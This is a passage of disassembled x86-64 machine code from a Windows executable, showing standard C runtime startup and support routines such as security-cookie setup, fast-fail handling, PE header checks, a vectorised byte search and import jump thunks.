   140008e75:	41 0f ba e2 13       	bt     $0x13,%r10d
   140008e7a:	73 4a                	jae    0x140008ec6
   140008e7c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008e81:	22 c2                	and    %dl,%al
   140008e83:	3a c2                	cmp    %dl,%al
   140008e85:	75 3f                	jne    0x140008ec6
   140008e87:	41 8b cb             	mov    %r11d,%ecx
   140008e8a:	41 8b c3             	mov    %r11d,%eax
   140008e8d:	48 c1 e9 10          	shr    $0x10,%rcx
   140008e91:	25 ff 00 04 00       	and    $0x400ff,%eax
   140008e96:	83 e1 06             	and    $0x6,%ecx
   140008e99:	89 05 01 df 01 00    	mov    %eax,0x1df01(%rip)        # 0x140026da0
   140008e9f:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140008ea6:	48 f7 d1             	not    %rcx
   140008ea9:	48 23 0d d8 91 00 00 	and    0x91d8(%rip),%rcx        # 0x140012088
   140008eb0:	48 89 0d d1 91 00 00 	mov    %rcx,0x91d1(%rip)        # 0x140012088
   140008eb7:	3c 01                	cmp    $0x1,%al
   140008eb9:	76 0b                	jbe    0x140008ec6
   140008ebb:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140008ebf:	48 89 0d c2 91 00 00 	mov    %rcx,0x91c2(%rip)        # 0x140012088
   140008ec6:	41 0f ba e2 15       	bt     $0x15,%r10d
   140008ecb:	73 15                	jae    0x140008ee2
   140008ecd:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008ed2:	48 0f ba e0 13       	bt     $0x13,%rax
   140008ed7:	73 09                	jae    0x140008ee2
   140008ed9:	48 0f ba 35 a6 91 00 	btrq   $0x7,0x91a6(%rip)        # 0x140012088
   140008ee0:	00 07 
   140008ee2:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140008ee7:	33 c0                	xor    %eax,%eax
   140008ee9:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140008eee:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008ef3:	48 83 c4 10          	add    $0x10,%rsp
   140008ef7:	5f                   	pop    %rdi
   140008ef8:	c3                   	ret
   140008ef9:	cc                   	int3
   140008efa:	cc                   	int3
   140008efb:	cc                   	int3
   140008efc:	b8 01 00 00 00       	mov    $0x1,%eax
   140008f01:	c3                   	ret
   140008f02:	cc                   	int3
   140008f03:	cc                   	int3
   140008f04:	33 c0                	xor    %eax,%eax
   140008f06:	39 05 a8 91 00 00    	cmp    %eax,0x91a8(%rip)        # 0x1400120b4
   140008f0c:	0f 95 c0             	setne  %al
   140008f0f:	c3                   	ret
   140008f10:	c7 05 8e de 01 00 00 	movl   $0x0,0x1de8e(%rip)        # 0x140026da8
   140008f17:	00 00 00 
   140008f1a:	c3                   	ret
   140008f1b:	cc                   	int3
   140008f1c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008f21:	55                   	push   %rbp
   140008f22:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140008f29:	ff 
   140008f2a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140008f31:	8b d9                	mov    %ecx,%ebx
   140008f33:	b9 17 00 00 00       	mov    $0x17,%ecx
   140008f38:	ff 15 1a 21 00 00    	call   *0x211a(%rip)        # 0x14000b058
   140008f3e:	85 c0                	test   %eax,%eax
   140008f40:	74 04                	je     0x140008f46
   140008f42:	8b cb                	mov    %ebx,%ecx
   140008f44:	cd 29                	int    $0x29
   140008f46:	b9 03 00 00 00       	mov    $0x3,%ecx
   140008f4b:	e8 c0 ff ff ff       	call   0x140008f10
   140008f50:	33 d2                	xor    %edx,%edx
   140008f52:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140008f56:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140008f5c:	e8 84 05 00 00       	call   0x1400094e5
   140008f61:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140008f65:	ff 15 2d 21 00 00    	call   *0x212d(%rip)        # 0x14000b098
   140008f6b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140008f72:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140008f79:	48 8b cb             	mov    %rbx,%rcx
   140008f7c:	45 33 c0             	xor    %r8d,%r8d
   140008f7f:	ff 15 a3 20 00 00    	call   *0x20a3(%rip)        # 0x14000b028
   140008f85:	48 85 c0             	test   %rax,%rax
   140008f88:	74 3f                	je     0x140008fc9
   140008f8a:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140008f91:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140008f98:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140008f9f:	00 00 
   140008fa1:	4c 8b c8             	mov    %rax,%r9
   140008fa4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140008fa9:	4c 8b c3             	mov    %rbx,%r8
   140008fac:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140008fb3:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140008fb8:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140008fbc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008fc1:	33 c9                	xor    %ecx,%ecx
   140008fc3:	ff 15 67 20 00 00    	call   *0x2067(%rip)        # 0x14000b030
   140008fc9:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140008fd0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140008fd5:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140008fdc:	33 d2                	xor    %edx,%edx
   140008fde:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140008fe5:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140008feb:	48 83 c0 08          	add    $0x8,%rax
   140008fef:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140008ff6:	e8 ea 04 00 00       	call   0x1400094e5
   140008ffb:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140009002:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140009007:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000900e:	40 
   14000900f:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140009016:	00 
   140009017:	ff 15 43 20 00 00    	call   *0x2043(%rip)        # 0x14000b060
   14000901d:	8b d8                	mov    %eax,%ebx
   14000901f:	33 c9                	xor    %ecx,%ecx
   140009021:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140009026:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000902b:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000902f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140009034:	ff 15 06 20 00 00    	call   *0x2006(%rip)        # 0x14000b040
   14000903a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000903f:	ff 15 f3 1f 00 00    	call   *0x1ff3(%rip)        # 0x14000b038
   140009045:	85 c0                	test   %eax,%eax
   140009047:	75 0d                	jne    0x140009056
   140009049:	83 fb 01             	cmp    $0x1,%ebx
   14000904c:	74 08                	je     0x140009056
   14000904e:	8d 48 03             	lea    0x3(%rax),%ecx
   140009051:	e8 ba fe ff ff       	call   0x140008f10
   140009056:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000905d:	00 
   14000905e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140009065:	5d                   	pop    %rbp
   140009066:	c3                   	ret
   140009067:	cc                   	int3
   140009068:	e9 03 00 00 00       	jmp    0x140009070
   14000906d:	cc                   	int3
   14000906e:	cc                   	int3
   14000906f:	cc                   	int3
   140009070:	33 c0                	xor    %eax,%eax
   140009072:	c3                   	ret
   140009073:	cc                   	int3
   140009074:	48 83 ec 28          	sub    $0x28,%rsp
   140009078:	33 c9                	xor    %ecx,%ecx
   14000907a:	ff 15 e8 1f 00 00    	call   *0x1fe8(%rip)        # 0x14000b068
   140009080:	48 85 c0             	test   %rax,%rax
   140009083:	74 3a                	je     0x1400090bf
   140009085:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000908a:	66 39 08             	cmp    %cx,(%rax)
   14000908d:	75 30                	jne    0x1400090bf
   14000908f:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140009093:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   14000909a:	75 23                	jne    0x1400090bf
   14000909c:	ba 0b 02 00 00       	mov    $0x20b,%edx
   1400090a1:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   1400090a6:	75 17                	jne    0x1400090bf
   1400090a8:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   1400090af:	0e 
   1400090b0:	76 0d                	jbe    0x1400090bf
   1400090b2:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   1400090b9:	00 
   1400090ba:	0f 95 c0             	setne  %al
   1400090bd:	eb 02                	jmp    0x1400090c1
   1400090bf:	32 c0                	xor    %al,%al
   1400090c1:	48 83 c4 28          	add    $0x28,%rsp
   1400090c5:	c3                   	ret
   1400090c6:	cc                   	int3
   1400090c7:	cc                   	int3
   1400090c8:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400090d8
   1400090cf:	48 ff 25 6a 1f 00 00 	rex.W jmp *0x1f6a(%rip)        # 0x14000b040
   1400090d6:	cc                   	int3
   1400090d7:	cc                   	int3
   1400090d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400090dd:	57                   	push   %rdi
   1400090de:	48 83 ec 20          	sub    $0x20,%rsp
   1400090e2:	48 8b 19             	mov    (%rcx),%rbx
   1400090e5:	48 8b f9             	mov    %rcx,%rdi
   1400090e8:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400090ee:	75 24                	jne    0x140009114
   1400090f0:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400090f4:	75 1e                	jne    0x140009114
   1400090f6:	8b 53 20             	mov    0x20(%rbx),%edx
   1400090f9:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   1400090ff:	74 20                	je     0x140009121
   140009101:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   140009107:	83 f8 01             	cmp    $0x1,%eax
   14000910a:	76 15                	jbe    0x140009121
   14000910c:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140009112:	74 0d                	je     0x140009121
   140009114:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009119:	33 c0                	xor    %eax,%eax
   14000911b:	48 83 c4 20          	add    $0x20,%rsp
   14000911f:	5f                   	pop    %rdi
   140009120:	c3                   	ret
   140009121:	e8 b3 03 00 00       	call   0x1400094d9
   140009126:	48 89 18             	mov    %rbx,(%rax)
   140009129:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000912d:	e8 ad 03 00 00       	call   0x1400094df
   140009132:	48 89 18             	mov    %rbx,(%rax)
   140009135:	e8 47 04 00 00       	call   0x140009581
   14000913a:	cc                   	int3
   14000913b:	cc                   	int3
   14000913c:	c2 00 00             	ret    $0x0
   14000913f:	cc                   	int3
   140009140:	e9 42 04 00 00       	jmp    0x140009587
   140009145:	cc                   	int3
   140009146:	cc                   	int3
   140009147:	cc                   	int3
   140009148:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000914d:	55                   	push   %rbp
   14000914e:	48 8b ec             	mov    %rsp,%rbp
   140009151:	48 83 ec 30          	sub    $0x30,%rsp
   140009155:	48 8b 05 e4 8e 00 00 	mov    0x8ee4(%rip),%rax        # 0x140012040
   14000915c:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140009163:	2b 00 00 
   140009166:	48 3b c3             	cmp    %rbx,%rax
   140009169:	75 77                	jne    0x1400091e2
   14000916b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000916f:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140009176:	00 
   140009177:	ff 15 0b 1f 00 00    	call   *0x1f0b(%rip)        # 0x14000b088
   14000917d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009181:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009185:	ff 15 f5 1e 00 00    	call   *0x1ef5(%rip)        # 0x14000b080
   14000918b:	8b c0                	mov    %eax,%eax
   14000918d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140009191:	ff 15 e1 1e 00 00    	call   *0x1ee1(%rip)        # 0x14000b078
   140009197:	8b c0                	mov    %eax,%eax
   140009199:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000919d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400091a1:	ff 15 c9 1e 00 00    	call   *0x1ec9(%rip)        # 0x14000b070
   1400091a7:	8b 45 18             	mov    0x18(%rbp),%eax
   1400091aa:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400091ae:	48 c1 e0 20          	shl    $0x20,%rax
   1400091b2:	48 33 45 18          	xor    0x18(%rbp),%rax
   1400091b6:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   1400091ba:	48 33 c1             	xor    %rcx,%rax
   1400091bd:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1400091c4:	ff 00 00 
   1400091c7:	48 23 c1             	and    %rcx,%rax
   1400091ca:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   1400091d1:	2b 00 00 
   1400091d4:	48 3b c3             	cmp    %rbx,%rax
   1400091d7:	48 0f 44 c1          	cmove  %rcx,%rax
   1400091db:	48 89 05 5e 8e 00 00 	mov    %rax,0x8e5e(%rip)        # 0x140012040
   1400091e2:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400091e7:	48 f7 d0             	not    %rax
   1400091ea:	48 89 05 8f 8e 00 00 	mov    %rax,0x8e8f(%rip)        # 0x140012080
   1400091f1:	48 83 c4 30          	add    $0x30,%rsp
   1400091f5:	5d                   	pop    %rbp
   1400091f6:	c3                   	ret
   1400091f7:	cc                   	int3
   1400091f8:	b8 00 40 00 00       	mov    $0x4000,%eax
   1400091fd:	c3                   	ret
   1400091fe:	cc                   	int3
   1400091ff:	cc                   	int3
   140009200:	48 8d 0d a9 db 01 00 	lea    0x1dba9(%rip),%rcx        # 0x140026db0
   140009207:	48 ff 25 82 1e 00 00 	rex.W jmp *0x1e82(%rip)        # 0x14000b090
   14000920e:	cc                   	int3
   14000920f:	cc                   	int3
   140009210:	b0 01                	mov    $0x1,%al
   140009212:	c3                   	ret
   140009213:	cc                   	int3
   140009214:	48 8d 05 a5 db 01 00 	lea    0x1dba5(%rip),%rax        # 0x140026dc0
   14000921b:	c3                   	ret
   14000921c:	48 8d 05 a5 db 01 00 	lea    0x1dba5(%rip),%rax        # 0x140026dc8
   140009223:	c3                   	ret
   140009224:	48 83 ec 28          	sub    $0x28,%rsp
   140009228:	e8 e7 ff ff ff       	call   0x140009214
   14000922d:	48 83 08 24          	orq    $0x24,(%rax)
   140009231:	e8 e6 ff ff ff       	call   0x14000921c
   140009236:	48 83 08 02          	orq    $0x2,(%rax)
   14000923a:	48 83 c4 28          	add    $0x28,%rsp
   14000923e:	c3                   	ret
   14000923f:	cc                   	int3
   140009240:	33 c0                	xor    %eax,%eax
   140009242:	39 05 60 8e 00 00    	cmp    %eax,0x8e60(%rip)        # 0x1400120a8
   140009248:	0f 94 c0             	sete   %al
   14000924b:	c3                   	ret
   14000924c:	48 8d 05 45 dd 01 00 	lea    0x1dd45(%rip),%rax        # 0x140026f98
   140009253:	c3                   	ret
   140009254:	48 8d 05 35 dd 01 00 	lea    0x1dd35(%rip),%rax        # 0x140026f90
   14000925b:	c3                   	ret
   14000925c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009261:	57                   	push   %rdi
   140009262:	48 83 ec 20          	sub    $0x20,%rsp
   140009266:	48 8d 1d bb 64 00 00 	lea    0x64bb(%rip),%rbx        # 0x14000f728
   14000926d:	48 8d 3d b4 64 00 00 	lea    0x64b4(%rip),%rdi        # 0x14000f728
   140009274:	eb 12                	jmp    0x140009288
   140009276:	48 8b 03             	mov    (%rbx),%rax
   140009279:	48 85 c0             	test   %rax,%rax
   14000927c:	74 06                	je     0x140009284
   14000927e:	ff 15 7c 21 00 00    	call   *0x217c(%rip)        # 0x14000b400
   140009284:	48 83 c3 08          	add    $0x8,%rbx
   140009288:	48 3b df             	cmp    %rdi,%rbx
   14000928b:	72 e9                	jb     0x140009276
   14000928d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009292:	48 83 c4 20          	add    $0x20,%rsp
   140009296:	5f                   	pop    %rdi
   140009297:	c3                   	ret
   140009298:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000929d:	57                   	push   %rdi
   14000929e:	48 83 ec 20          	sub    $0x20,%rsp
   1400092a2:	48 8d 1d 8f 64 00 00 	lea    0x648f(%rip),%rbx        # 0x14000f738
   1400092a9:	48 8d 3d 88 64 00 00 	lea    0x6488(%rip),%rdi        # 0x14000f738
   1400092b0:	eb 12                	jmp    0x1400092c4
   1400092b2:	48 8b 03             	mov    (%rbx),%rax
   1400092b5:	48 85 c0             	test   %rax,%rax
   1400092b8:	74 06                	je     0x1400092c0
   1400092ba:	ff 15 40 21 00 00    	call   *0x2140(%rip)        # 0x14000b400
   1400092c0:	48 83 c3 08          	add    $0x8,%rbx
   1400092c4:	48 3b df             	cmp    %rdi,%rbx
   1400092c7:	72 e9                	jb     0x1400092b2
   1400092c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400092ce:	48 83 c4 20          	add    $0x20,%rsp
   1400092d2:	5f                   	pop    %rdi
   1400092d3:	c3                   	ret
   1400092d4:	cc                   	int3
   1400092d5:	cc                   	int3
   1400092d6:	cc                   	int3
   1400092d7:	cc                   	int3
   1400092d8:	cc                   	int3
   1400092d9:	cc                   	int3
   1400092da:	cc                   	int3
   1400092db:	cc                   	int3
   1400092dc:	cc                   	int3
   1400092dd:	cc                   	int3
   1400092de:	cc                   	int3
   1400092df:	cc                   	int3
   1400092e0:	ff 25 ba 1e 00 00    	jmp    *0x1eba(%rip)        # 0x14000b1a0
   1400092e6:	cc                   	int3
   1400092e7:	cc                   	int3
   1400092e8:	40 53                	rex push %rbx
   1400092ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400092ee:	48 8b d9             	mov    %rcx,%rbx
   1400092f1:	b9 10 00 00 00       	mov    $0x10,%ecx
   1400092f6:	ff 15 84 1f 00 00    	call   *0x1f84(%rip)        # 0x14000b280
   1400092fc:	48 8b d0             	mov    %rax,%rdx
   1400092ff:	48 85 c0             	test   %rax,%rax
   140009302:	74 1b                	je     0x14000931f
   140009304:	48 8b 05 c5 da 01 00 	mov    0x1dac5(%rip),%rax        # 0x140026dd0
   14000930b:	48 89 02             	mov    %rax,(%rdx)
   14000930e:	48 89 5a 08          	mov    %rbx,0x8(%rdx)
   140009312:	48 89 15 b7 da 01 00 	mov    %rdx,0x1dab7(%rip)        # 0x140026dd0
   140009319:	48 83 c4 20          	add    $0x20,%rsp
   14000931d:	5b                   	pop    %rbx
   14000931e:	c3                   	ret
   14000931f:	e8 97 01 00 00       	call   0x1400094bb
   140009324:	cc                   	int3
   140009325:	cc                   	int3
   140009326:	cc                   	int3
   140009327:	cc                   	int3
   140009328:	cc                   	int3
   140009329:	cc                   	int3
   14000932a:	cc                   	int3
   14000932b:	cc                   	int3
   14000932c:	cc                   	int3
   14000932d:	cc                   	int3
   14000932e:	cc                   	int3
   14000932f:	cc                   	int3
   140009330:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009335:	8b 05 59 8d 00 00    	mov    0x8d59(%rip),%eax        # 0x140012094
   14000933b:	4c 8b ca             	mov    %rdx,%r9
   14000933e:	4c 2b c9             	sub    %rcx,%r9
   140009341:	4c 8b d1             	mov    %rcx,%r10
   140009344:	4d 8b d9             	mov    %r9,%r11
   140009347:	48 8b da             	mov    %rdx,%rbx
   14000934a:	49 83 e3 e0          	and    $0xffffffffffffffe0,%r11
   14000934e:	0f 84 c2 00 00 00    	je     0x140009416
   140009354:	a8 20                	test   $0x20,%al
   140009356:	0f 84 ba 00 00 00    	je     0x140009416
   14000935c:	41 0f be c0          	movsbl %r8b,%eax
   140009360:	48 8b ca             	mov    %rdx,%rcx
   140009363:	c5 f9 6e d8          	vmovd  %eax,%xmm3
   140009367:	c5 f9 ef c0          	vpxor  %xmm0,%xmm0,%xmm0
   14000936b:	c4 e2 61 00 d8       	vpshufb %xmm0,%xmm3,%xmm3
   140009370:	c4 e3 65 18 db 01    	vinsertf128 $0x1,%xmm3,%ymm3,%ymm3
   140009376:	49 2b cb             	sub    %r11,%rcx
   140009379:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009380:	c5 e5 74 4a e0       	vpcmpeqb -0x20(%rdx),%ymm3,%ymm1
   140009385:	48 83 ea 20          	sub    $0x20,%rdx
   140009389:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   14000938d:	85 c0                	test   %eax,%eax
   14000938f:	75 6c                	jne    0x1400093fd
   140009391:	48 3b d1             	cmp    %rcx,%rdx
   140009394:	75 ea                	jne    0x140009380
   140009396:	41 83 e1 1c          	and    $0x1c,%r9d
   14000939a:	74 43                	je     0x1400093df
   14000939c:	49 2b d1             	sub    %r9,%rdx
   14000939f:	48 8d 05 fa 46 00 00 	lea    0x46fa(%rip),%rax        # 0x14000daa0
   1400093a6:	49 83 e1 fc          	and    $0xfffffffffffffffc,%r9
   1400093aa:	49 2b c1             	sub    %r9,%rax
   1400093ad:	c5 fe 6f 10          	vmovdqu (%rax),%ymm2
   1400093b1:	c4 e2 6d 8c 02       	vpmaskmovd (%rdx),%ymm2,%ymm0
   1400093b6:	c5 fd 74 cb          	vpcmpeqb %ymm3,%ymm0,%ymm1
   1400093ba:	c5 f5 db d2          	vpand  %ymm2,%ymm1,%ymm2
   1400093be:	c5 fd d7 c2          	vpmovmskb %ymm2,%eax
   1400093c2:	85 c0                	test   %eax,%eax
   1400093c4:	74 19                	je     0x1400093df
   1400093c6:	f3 0f bd c0          	lzcnt  %eax,%eax
   1400093ca:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400093cf:	2b c8                	sub    %eax,%ecx
   1400093d1:	8b c1                	mov    %ecx,%eax
   1400093d3:	48 03 c2             	add    %rdx,%rax
   1400093d6:	c5 f8 77             	vzeroupper
   1400093d9:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400093de:	c3                   	ret
   1400093df:	c5 f8 77             	vzeroupper
   1400093e2:	49 3b d2             	cmp    %r10,%rdx
   1400093e5:	74 0d                	je     0x1400093f4
   1400093e7:	48 ff ca             	dec    %rdx
   1400093ea:	44 38 02             	cmp    %r8b,(%rdx)
   1400093ed:	74 79                	je     0x140009468
   1400093ef:	49 3b d2             	cmp    %r10,%rdx
   1400093f2:	75 f3                	jne    0x1400093e7
   1400093f4:	48 8b c3             	mov    %rbx,%rax
   1400093f7:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400093fc:	c3                   	ret
   1400093fd:	c5 f8 77             	vzeroupper
   140009400:	f3 0f bd c0          	lzcnt  %eax,%eax
   140009404:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   140009409:	2b c8                	sub    %eax,%ecx
   14000940b:	8b c1                	mov    %ecx,%eax
   14000940d:	48 03 c2             	add    %rdx,%rax
   140009410:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140009415:	c3                   	ret
   140009416:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000941a:	74 c6                	je     0x1400093e2
   14000941c:	a8 04                	test   $0x4,%al
   14000941e:	74 c2                	je     0x1400093e2
   140009420:	41 0f b6 c0          	movzbl %r8b,%eax
   140009424:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009427:	48 8b ca             	mov    %rdx,%rcx
   14000942a:	49 2b c9             	sub    %r9,%rcx
   14000942d:	66 0f 6e c8          	movd   %eax,%xmm1
   140009431:	66 0f 38 00 c8       	pshufb %xmm0,%xmm1
   140009436:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000943d:	00 00 00 
   140009440:	f3 0f 6f 42 f0       	movdqu -0x10(%rdx),%xmm0
   140009445:	48 83 ea 10          	sub    $0x10,%rdx
   140009449:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000944d:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140009451:	85 c0                	test   %eax,%eax
   140009453:	75 07                	jne    0x14000945c
   140009455:	48 3b d1             	cmp    %rcx,%rdx
   140009458:	75 e6                	jne    0x140009440
   14000945a:	eb 86                	jmp    0x1400093e2
   14000945c:	0f bd c0             	bsr    %eax,%eax
   14000945f:	48 03 c2             	add    %rdx,%rax
   140009462:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140009467:	c3                   	ret
   140009468:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000946d:	48 8b c2             	mov    %rdx,%rax
   140009470:	c3                   	ret
   140009471:	cc                   	int3
   140009472:	cc                   	int3
   140009473:	cc                   	int3
   140009474:	cc                   	int3
   140009475:	cc                   	int3
   140009476:	cc                   	int3
   140009477:	cc                   	int3
   140009478:	cc                   	int3
   140009479:	cc                   	int3
   14000947a:	cc                   	int3
   14000947b:	cc                   	int3
   14000947c:	cc                   	int3
   14000947d:	cc                   	int3
   14000947e:	cc                   	int3
   14000947f:	cc                   	int3
   140009480:	e9 ab fe ff ff       	jmp    0x140009330
   140009485:	ff 25 65 1d 00 00    	jmp    *0x1d65(%rip)        # 0x14000b1f0
   14000948b:	ff 25 87 1c 00 00    	jmp    *0x1c87(%rip)        # 0x14000b118
   140009491:	ff 25 89 1c 00 00    	jmp    *0x1c89(%rip)        # 0x14000b120
   140009497:	ff 25 8b 1c 00 00    	jmp    *0x1c8b(%rip)        # 0x14000b128
   14000949d:	ff 25 8d 1c 00 00    	jmp    *0x1c8d(%rip)        # 0x14000b130
   1400094a3:	ff 25 8f 1c 00 00    	jmp    *0x1c8f(%rip)        # 0x14000b138
   1400094a9:	ff 25 91 1c 00 00    	jmp    *0x1c91(%rip)        # 0x14000b140
   1400094af:	ff 25 93 1c 00 00    	jmp    *0x1c93(%rip)        # 0x14000b148
   1400094b5:	ff 25 95 1c 00 00    	jmp    *0x1c95(%rip)        # 0x14000b150
   1400094bb:	ff 25 cf 1c 00 00    	jmp    *0x1ccf(%rip)        # 0x14000b190
   1400094c1:	ff 25 91 1d 00 00    	jmp    *0x1d91(%rip)        # 0x14000b258
   1400094c7:	ff 25 53 1d 00 00    	jmp    *0x1d53(%rip)        # 0x14000b220
   1400094cd:	ff 25 45 1d 00 00    	jmp    *0x1d45(%rip)        # 0x14000b218
   1400094d3:	ff 25 37 1d 00 00    	jmp    *0x1d37(%rip)        # 0x14000b210
   1400094d9:	ff 25 59 1d 00 00    	jmp    *0x1d59(%rip)        # 0x14000b238
   1400094df:	ff 25 23 1d 00 00    	jmp    *0x1d23(%rip)        # 0x14000b208
   1400094e5:	ff 25 15 1d 00 00    	jmp    *0x1d15(%rip)        # 0x14000b200
   1400094eb:	ff 25 4f 1d 00 00    	jmp    *0x1d4f(%rip)        # 0x14000b240
   1400094f1:	ff 25 91 1d 00 00    	jmp    *0x1d91(%rip)        # 0x14000b288
   1400094f7:	ff 25 83 1d 00 00    	jmp    *0x1d83(%rip)        # 0x14000b280
   1400094fd:	ff 25 2d 1e 00 00    	jmp    *0x1e2d(%rip)        # 0x14000b330
   140009503:	ff 25 37 1e 00 00    	jmp    *0x1e37(%rip)        # 0x14000b340
   140009509:	ff 25 39 1e 00 00    	jmp    *0x1e39(%rip)        # 0x14000b348
   14000950f:	ff 25 13 1e 00 00    	jmp    *0x1e13(%rip)        # 0x14000b328
   140009515:	ff 25 3d 1e 00 00    	jmp    *0x1e3d(%rip)        # 0x14000b358
   14000951b:	ff 25 df 1d 00 00    	jmp    *0x1ddf(%rip)        # 0x14000b300
   140009521:	ff 25 11 1e 00 00    	jmp    *0x1e11(%rip)        # 0x14000b338
   140009527:	ff 25 9b 1d 00 00    	jmp    *0x1d9b(%rip)        # 0x14000b2c8
   14000952d:	ff 25 85 1d 00 00    	jmp    *0x1d85(%rip)        # 0x14000b2b8
   140009533:	ff 25 97 1d 00 00    	jmp    *0x1d97(%rip)        # 0x14000b2d0
   140009539:	ff 25 99 1d 00 00    	jmp    *0x1d99(%rip)        # 0x14000b2d8
   14000953f:	ff 25 9b 1d 00 00    	jmp    *0x1d9b(%rip)        # 0x14000b2e0
   140009545:	ff 25 9d 1d 00 00    	jmp    *0x1d9d(%rip)        # 0x14000b2e8
   14000954b:	ff 25 9f 1d 00 00    	jmp    *0x1d9f(%rip)        # 0x14000b2f0
   140009551:	ff 25 79 1e 00 00    	jmp    *0x1e79(%rip)        # 0x14000b3d0
   140009557:	ff 25 9b 1d 00 00    	jmp    *0x1d9b(%rip)        # 0x14000b2f8
   14000955d:	ff 25 ed 1d 00 00    	jmp    *0x1ded(%rip)        # 0x14000b350
   140009563:	ff 25 9f 1d 00 00    	jmp    *0x1d9f(%rip)        # 0x14000b308
   140009569:	ff 25 a1 1d 00 00    	jmp    *0x1da1(%rip)        # 0x14000b310
   14000956f:	ff 25 33 1d 00 00    	jmp    *0x1d33(%rip)        # 0x14000b2a8
